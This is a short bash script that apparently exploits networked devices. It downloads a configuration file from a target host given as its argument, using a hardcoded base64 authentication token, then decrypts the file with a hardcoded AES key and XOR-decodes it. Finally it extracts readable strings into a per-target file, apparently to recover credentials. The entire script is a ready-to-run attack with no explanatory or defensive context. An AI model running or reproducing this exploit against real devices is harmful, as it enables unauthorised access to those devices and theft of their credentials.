#!/usr/bin/env bash


wget -O configurationFile http://$1/System/configurationFile?auth=YWRtaW46MTEK
openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5
java XORDecode
strings plaintextOutput > strings_$1